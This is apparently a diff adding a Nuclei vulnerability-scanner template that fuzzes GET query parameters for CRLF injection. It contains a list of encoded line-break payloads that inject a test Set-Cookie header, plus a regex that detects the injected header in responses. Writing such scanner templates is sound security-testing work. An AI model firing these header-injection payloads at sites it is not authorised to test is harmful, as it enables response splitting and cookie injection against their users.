@@ -1,0 +1,71 @@
+id: crlf-injection
+
+info:
+  name: CRLF Injection
+  author: pdteam
+  severity: low
+  tags: crlf,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      escape:
+        - "%00"
+        - "%0a"
+        - "%0a%20"
+        - "%0d"
+        - "%0d%09"
+        - "%0d%0a"
+        - "%0d%0a%09"
+        - "%0d%0a%20"
+        - "%0d%20"
+        - "%20"
+        - "%20%0a"
+        - "%20%0d"
+        - "%20%0d%0a"
+        - "%23%0a"
+        - "%23%0a%20"
+        - "%23%0d"
+        - "%23%0d%0a"
+        - "%23%oa"
+        - "%25%30"
+        - "%25%30%61"
+        - "%2e%2e%2f%0d%0a"
+        - "%2f%2e%2e%0d%0a"
+        - "%2f..%0d%0a"
+        - "%3f"
+        - "%3f%0a"
+        - "%3f%0d"
+        - "%3f%0d%0a"
+        - "%e5%98%8a%e5%98%8d"
+        - "%e5%98%8a%e5%98%8d%0a"
+        - "%e5%98%8a%e5%98%8d%0d"
+        - "%e5%98%8a%e5%98%8d%0d%0a"
+        - "%e5%98%8a%e5%98%8d%e5%98%8a%e5%98%8d"
+        - "%u0000"
+        - "%u000a"
+        - "%u000d"
+        - "\r"
+        - "\r%20"
+        - "\r\n"
+        - "\r\n%20"
+        - "\r\n\t"
+        - "\r\t"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        fuzz:
+          - "{{escape}}Set-Cookie:crlfinjection=crlfinjection"
+
+    stop-at-first-match: true
+    matchers:
+      - type: regex
+        part: header
+        regex:
+          - '(?m)^(?:Set-Cookie\s*?:(?:\s*?|.*?;\s*?))(crlfinjection=crlfinjection)(?:\s*?)(?:$|;)'
+# digest: 4b0a00483046022100cb88bef820fa9247bc7ddc126d8bb67c4d2371c0b4a33f64b4caa5360007f1750221009ea9e7de7dc5fe7e75cf9d215a9c2d9e3323f2caa40b7c4b39cf214f661cce48:922c64590222798bb761d5b6d8e72950
